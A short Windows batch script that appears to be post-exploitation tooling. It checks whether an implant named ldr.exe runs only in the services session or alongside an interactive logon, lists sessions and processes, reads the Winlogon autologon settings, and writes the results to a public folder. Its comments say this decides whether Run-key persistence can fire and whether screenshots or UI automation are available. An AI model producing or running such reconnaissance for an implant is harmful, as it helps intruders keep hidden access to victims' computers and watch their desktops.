@echo off
REM desktop.bat - argument-free: is anybody logged into the interactive desktop?
REM Distinguishes "payload running in Session 0 (Services)" from "there is a real
REM console logon" -- which decides whether Run-key/onlogon persistence can fire and
REM whether desktop-level interaction (screenshots, UI automation) is available.
set OUT=C:\Users\Public\desktop.txt
del "%OUT%" 2>nul
echo == time %DATE% %TIME% >> "%OUT%"
echo == sessions >> "%OUT%"
qwinsta >> "%OUT%" 2>&1
echo == explorer.exe (interactive shell present?) >> "%OUT%"
tasklist /FI "IMAGENAME eq explorer.exe" >> "%OUT%" 2>&1
echo == our payload >> "%OUT%"
tasklist /FI "IMAGENAME eq ldr.exe" >> "%OUT%" 2>&1
echo == vmware user process (indicates console session) >> "%OUT%"
tasklist /FI "IMAGENAME eq vmtoolsd.exe" >> "%OUT%" 2>&1
echo == autologon state >> "%OUT%"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon >> "%OUT%" 2>&1
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName >> "%OUT%" 2>&1
echo == end %TIME% >> "%OUT%"
